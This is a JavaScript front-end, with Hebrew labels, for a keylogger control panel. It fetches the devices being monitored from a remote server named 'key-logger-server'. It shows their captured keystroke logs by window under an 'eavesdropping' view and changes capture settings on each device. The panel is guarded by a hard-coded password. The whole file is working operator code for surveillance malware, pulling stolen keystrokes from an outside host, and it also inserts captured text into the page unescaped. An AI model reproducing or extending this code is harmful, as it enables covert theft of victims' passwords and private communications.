// Lock Screen
let lockTimeout;
const LOCK_DELAY = 300000;
const SYSTEM_PASSWORD = '1234';

function initLockScreen() {
    document.addEventListener('mousemove', resetLockTimer);
    document.addEventListener('keypress', resetLockTimer);
    document.addEventListener('click', resetLockTimer);
    resetLockTimer();
}

function resetLockTimer() {
    clearTimeout(lockTimeout);
    lockTimeout = setTimeout(lockScreen, LOCK_DELAY);
}

function lockScreen() {
    document.getElementById('lockScreen').classList.add('active');
}

function attemptUnlock() {
    const password = document.getElementById('unlockPassword').value;
    if (password === SYSTEM_PASSWORD) {
        document.getElementById('lockScreen').classList.remove('active');
        document.getElementById('unlockPassword').value = '';
        resetLockTimer();
    } else {
        const lockScreen = document.getElementById('lockScreen');
        lockScreen.style.animation = 'none';
        lockScreen.offsetHeight;
        lockScreen.style.animation = 'glitch 0.3s linear';
    }
}

// Matrix Background
const canvas = document.getElementById('matrix-bg');
const ctx = canvas.getContext('2d');

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const matrix = "אבגדהוזחטיכלמנסעפצקרשת0123456789";
const drops = [];
const fontSize = 16;
const columns = canvas.width / fontSize;

for (let i = 0; i < columns; i++) {
    drops[i] = Math.random() * canvas.height / fontSize;
}

function drawMatrix() {
    ctx.fillStyle = 'rgba(13, 13, 26, 0.1)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = 'rgba(0, 255, 65, 0.8)';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = matrix[Math.floor(Math.random() * matrix.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.98) {
            drops[i] = 0;
        }
        drops[i] += 0.5 + Math.random() * 0.5;
    }
}

setInterval(drawMatrix, 40);

// Device Management
let devices = [];
const SERVER_URL = 'https://key-logger-server.onrender.com';
const mockDevices = [
    { macAddress: "00:11:22:33:44:55", name: "מחשב נייד של הרשי", connected: true, timeLimit: 180, storageLocation: "server", lastSeen: "2024-02-23 10:30" },
    { macAddress: "66:77:88:99:AA:BB", name: "טאבלט משפחתי", connected: false, timeLimit: null, storageLocation: "file", lastSeen: "2024-02-22 15:45" }
];
let currentMac = null;
let originalLogs = {};
let parsedLogArray = [];

async function fetchDevices() {
    document.getElementById('loadingMessage').style.display = 'block';
    try {
        const response = await fetch(`${SERVER_URL}/api/status/all`);
        if (!response.ok) throw new Error(`Error: ${response.status}`);
        const data = await response.json();
        if (!data || data.length === 0) throw new Error("No devices found");
        devices = data.map(device => ({
            macAddress: device.mac_address,
            name: device.name || '',
            connected: device.connected || false,
            timeLimit: device.timeLimit || null,
            storageLocation: device.storageLocation || 'server',
            lastSeen: device.lastSeen || ''
        }));
    } catch (error) {
        console.error(error);
        devices = mockDevices;
    }
    renderDevices();
    document.getElementById('loadingMessage').style.display = 'none';
}

function renderDevices() {
    const grid = document.getElementById('devicesGrid');
    let htmlStr = '';
    devices.forEach(device => {
        const timeRemainingHTML = device.timeLimit ? 
            `<div class="time-remaining">
                <span class="icon">⏱️</span> זמן נותר: ${formatTimeRemaining(device.timeLimit)}
             </div>` : '';
        
        htmlStr += `
            <div class="device-card">
                <div class="device-header">
                    <span class="device-name">${device.name || device.macAddress}</span>
                    <div class="status-wrapper">
                        <span class="status-indicator ${device.connected ? 'status-connected' : 'status-disconnected'}"></span>
                        <span class="status-text">${device.connected ? 'מחובר' : 'מנותק'}</span>
                    </div>
                </div>
                <div class="device-info">
                    <div class="info-item">
                        <span class="info-label">מזהה:</span>
                        <span class="info-value">${device.macAddress}</span>
                    </div>
                    ${timeRemainingHTML}
                    <div class="info-item">
                        <span class="info-label">אחסון:</span>
                        <span class="info-value">${device.storageLocation === 'server' ? 'שרת מרכזי' : 'קובץ מקומי'}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">עדכון אחרון:</span>
                        <span class="info-value">${device.lastSeen || 'לא ידוע'}</span>
                    </div>
                </div>
                <div class="card-actions">
                    <button class="button settings-button" onclick="openSettings('${device.macAddress}')">
                        <span class="icon">⚙️</span> הגדרות
                    </button>
                    <button class="button view-button" onclick="switchToEavesdropping('${device.macAddress}')">
                        <span class="icon">👁️</span> צפה בהאזנות
                    </button>
                </div>
            </div>
        `;
    });
    grid.innerHTML = htmlStr;
}

function formatTimeRemaining(timeLimit) {
    const days = Math.floor(timeLimit / (24 * 60));
    const hours = Math.floor((timeLimit % (24 * 60)) / 60);
    const minutes = timeLimit % 60;
    
    let formattedTime = '';
    if (days > 0) formattedTime += `${days} ימים `;
    if (hours > 0) formattedTime += `${hours} שעות `;
    if (minutes > 0) formattedTime += `${minutes} דקות`;
    
    return formattedTime.trim() || '0 דקות';
}

function openSettings(macAddress) {
    currentMac = macAddress;
    const device = devices.find(d => d.macAddress === macAddress);
    if (!device) return;
    document.getElementById('deviceName').value = device.name || '';
    document.getElementById('storageLocation').value = device.storageLocation || 'server';
    document.getElementById('saveFrequency').value = 5;
    document.getElementById('enableTimeLimit').checked = !!device.timeLimit;
    toggleTimeInputs();
    if (device.timeLimit) {
        const days = Math.floor(device.timeLimit / (24 * 60));
        const hours = Math.floor((device.timeLimit % (24 * 60)) / 60);
        const minutes = device.timeLimit % 60;
        document.getElementById('days').value = days;
        document.getElementById('hours').value = hours;
        document.getElementById('minutes').value = minutes;
    } else {
        document.getElementById('days').value = '';
        document.getElementById('hours').value = '';
        document.getElementById('minutes').value = '';
    }
    document.getElementById('settingsModal').style.display = 'block';
}

function closeModal() {
    document.getElementById('settingsModal').style.display = 'none';
    currentMac = null;
}

function toggleTimeInputs() {
    const timeInputs = document.getElementById("timeInputs");
    timeInputs.style.display = document.getElementById("enableTimeLimit").checked ? "block" : "none";
}

function getTimeLimitInMinutes() {
    const days = parseInt(document.getElementById('days').value) || 0;
    const hours = parseInt(document.getElementById('hours').value) || 0;
    const minutes = parseInt(document.getElementById('minutes').value) || 0;
    return (days * 24 * 60) + (hours * 60) + minutes;
}

async function saveSettings() {
    if (!currentMac) return closeModal();
    let device = devices.find(d => d.macAddress === currentMac);
    if (!device) return closeModal();
    let updatedDevice = {
        mac_address: currentMac,
        name: document.getElementById('deviceName').value,
        timeLimit: document.getElementById('enableTimeLimit').checked ? getTimeLimitInMinutes() : null,
        storageLocation: document.getElementById('storageLocation').value,
        saveFrequency: parseInt(document.getElementById('saveFrequency').value) || 5,
        connected: device.connected,
        lastSeen: device.lastSeen || new Date().toISOString().slice(0, 16).replace('T', ' ')
    };
    try {
        const response = await fetch(`${SERVER_URL}/api/status/change`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(updatedDevice)
        });
        if (!response.ok) throw new Error(`Error: ${response.status}`);
        alert('ההגדרות עודכנו בהצלחה!');
    } catch (err) {
        console.error(err);
        alert('לא הצלחנו לעדכן את המכשיר בשרת.');
    }
    closeModal();
    fetchDevices();
}

// Eavesdropping Section
async function fetchLogs(mac) {
    const url = `${SERVER_URL}/api/data/files`;
    const formattedMac = mac.replaceAll(':', '_'); // החלפת נקודותיים בקו תחתי
    try {
        const response = await fetch(url, {
            method: 'GET',
            headers: { 'Content-Type': 'application/json', 'mac-address': formattedMac }
        });
        if (!response.ok) throw new Error('שגיאה בטעינת ההאזנות');
        originalLogs = await response.json();
        parsedLogArray = parseLogs(originalLogs);
        populateWindowList(parsedLogArray);
        displayLogs(parsedLogArray);
    } catch (err) {
        console.error(err);
        document.getElementById('logContainer').textContent = 'לא ניתן לטעון את ההאזנות';
    }
}

function parseLogs(logObject) {
    const result = [];
    for (let timestamp in logObject) {
        if (logObject.hasOwnProperty(timestamp)) {
            const [dmy, hm] = timestamp.split(' ');
            const [day, month, year] = dmy.split('/');
            const isoDate = `${year}-${month}-${day}`;
            const logsArray = logObject[timestamp];
            const structuredLogs = [];
            logsArray.forEach(item => {
                for (let windowName in item) {
                    if (item.hasOwnProperty(windowName)) {
                        structuredLogs.push({ windowName, text: item[windowName] });
                    }
                }
            });
            result.push({ fullDateStr: timestamp, date: isoDate, time: hm, logs: structuredLogs });
        }
    }
    return result;
}

function showLoading(show = true) {
    const loadingMessage = document.getElementById('loadingMessage');
    if (show) {
        loadingMessage.style.display = 'flex';
        loadingMessage.innerHTML = `
            <div class="loading-spinner"></div>
            <div>טוען נתונים...</div>`;
    } else {
        loadingMessage.style.display = 'none';
    }
}

function lockScreen() {
    const lockScreen = document.getElementById('lockScreen');
    lockScreen.classList.add('active');
    
    // אפקט גליץ' קל
    setTimeout(() => {
        lockScreen.style.animation = 'glitch 0.2s linear';
        setTimeout(() => {
            lockScreen.style.animation = '';
        }, 200);
    }, 300);
}

function attemptUnlock() {
    const password = document.getElementById('unlockPassword').value;
    if (password === SYSTEM_PASSWORD) {
        const lockScreen = document.getElementById('lockScreen');
        lockScreen.classList.remove('active');
        document.getElementById('unlockPassword').value = '';
        resetLockTimer();
        
        // אפקט הצלחה
        const mainContainer = document.getElementById('mainContainer');
        mainContainer.style.animation = 'pulse 0.5s';
        setTimeout(() => {
            mainContainer.style.animation = '';
        }, 500);
    } else {
        const lockContent = document.querySelector('.lock-content');
        lockContent.style.animation = 'glitch 0.3s linear';
        setTimeout(() => {
            lockContent.style.animation = '';
        }, 300);
        
        // רעידת שדה הסיסמה
        const passwordInput = document.getElementById('unlockPassword');
        passwordInput.classList.add('shake-error');
        setTimeout(() => {
            passwordInput.classList.remove('shake-error');
        }, 500);
    }
}

function populateWindowList(logArray) {
    const windowSet = new Set();
    logArray.forEach(entry => entry.logs.forEach(logItem => windowSet.add(logItem.windowName)));
    const filterWindowSelect = document.getElementById('filterWindow');
    while (filterWindowSelect.options.length > 1) filterWindowSelect.remove(1);
    windowSet.forEach(wName => {
        const opt = document.createElement('option');
        opt.value = wName;
        opt.textContent = wName;
        filterWindowSelect.appendChild(opt);
    });
}

function displayLogs(arrayToDisplay) {
    const container = document.getElementById('logContainer');
    container.innerHTML = '';
    
    if (arrayToDisplay.length === 0) {
        container.innerHTML = `
            <div class="no-results">
                <div class="no-results-icon">🔍</div>
                <div>לא נמצאו רשומות תואמות לסינון</div>
            </div>`;
        return;
    }
    
    arrayToDisplay.forEach(entry => {
        const tsDiv = document.createElement('div');
        tsDiv.className = 'log-entry';
        
        const timeLabel = document.createElement('div');
        timeLabel.className = 'timestamp';
        timeLabel.innerHTML = `<span class="icon">🕓</span> ${entry.fullDateStr}`;
        tsDiv.appendChild(timeLabel);
        
        entry.logs.forEach(logItem => {
            const windowDiv = document.createElement('div');
            windowDiv.className = 'log-item';
            windowDiv.innerHTML = `
                <div class="window-name">${logItem.windowName}</div>
                <div class="log-text">${logItem.text}</div>`;
            tsDiv.appendChild(windowDiv);
        });
        
        container.appendChild(tsDiv);
    });
}

function applyFilters() {
    const filterDate = document.getElementById('filterDate').value;
    const filterTime = document.getElementById('filterTime').value;
    const filterWindow = document.getElementById('filterWindow').value;
    const filtered = parsedLogArray.filter(entry => {
        if (filterDate && entry.date !== filterDate) return false;
        if (filterTime && entry.time !== filterTime) return false;
        if (filterWindow && !entry.logs.some(l => l.windowName === filterWindow)) return false;
        return true;
    });
    displayLogs(filtered);
}

// Navigation
function switchToEavesdropping(macAddress) {
    document.getElementById('devicesGrid').style.display = 'none';
    document.getElementById('loadingMessage').style.display = 'none';
    document.getElementById('eavesdroppingSection').style.display = 'block';
    document.getElementById('pageTitle').textContent = 'האזנות למחשב ספציפי';
    fetchLogs(macAddress);
}

function switchToDevices() {
    document.getElementById('eavesdroppingSection').style.display = 'none';
    document.getElementById('devicesGrid').style.display = 'grid';
    document.getElementById('loadingMessage').style.display = 'block';
    document.getElementById('pageTitle').textContent = 'מרכז שליטה ומעקב האזנות';
    fetchDevices();
}

// Initialization
document.addEventListener('DOMContentLoaded', () => {
    initLockScreen();
    fetchDevices();
    setInterval(fetchDevices, 30000);
    document.getElementById('unlockPassword').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') attemptUnlock();
    });
});
// https://key-logger-server.onrender.com/api/files/list